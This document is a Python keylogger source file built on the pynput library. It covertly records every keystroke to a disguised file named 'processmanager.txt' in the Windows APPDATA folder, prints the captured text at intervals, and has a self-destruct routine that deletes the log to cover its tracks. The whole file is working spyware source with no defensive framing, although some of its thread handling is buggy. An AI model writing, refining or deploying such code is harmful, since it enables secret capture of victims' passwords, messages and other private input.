import os
from pynput.keyboard import Listener
import time
import threading
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Keylogger:
    def __init__(self, log_file_path=None):
        self.keys = []
        self.count = 0
        self.flag = False
        self.listener = None
        self.log_file_path = log_file_path or os.path.join(os.environ['appdata'], 'processmanager.txt')

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 10:  # Log every 10 keystrokes
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        try:
            with open(self.log_file_path, 'r') as f:
                return f.read()
        except FileNotFoundError:
            logging.warning(f"Log file not found: {self.log_file_path}")
            return ""
        except Exception as e:
            logging.error(f"Error reading logs: {e}")
            return ""

    def write_file(self, keys):
        try:
            with open(self.log_file_path, 'a') as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find('backspace') > 0:
                        f.write(' Backspace ')
                    elif k.find('enter') > 0:
                        f.write('\n')
                    elif k.find('shift') > 0:
                        f.write(' Shift ')
                    elif k.find('space') > 0:
                        f.write(' ')
                    elif k.find('caps_lock') > 0:
                        f.write(' caps_lock ')
                    elif k.find('Key'):
                        f.write(k)
            logging.info(f"Wrote {len(keys)} keystrokes to log file")
        except Exception as e:
            logging.error(f"Error writing to log file: {e}")

    def self_destruct(self):
        self.flag = True
        if self.listener:
            self.listener.stop()
        try:
            os.remove(self.log_file_path)
            logging.info(f"Removed log file: {self.log_file_path}")
        except FileNotFoundError:
            logging.warning(f"Log file not found: {self.log_file_path}")
        except Exception as e:
            logging.error(f"Error removing log file: {e}")

    def start(self):
        global listener
        listener = Listener(on_press=self.on_press)
        listener.start()

    def stop(self):
        if listener:
            listener.stop()

def main():
    keylog = Keylogger()
    
    t = threading.Thread(target=keylog.start)
    t.start()

    while not keylog.flag:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)

    keylog.stop()
    t.join()

if __name__ == '__main__':
    main()
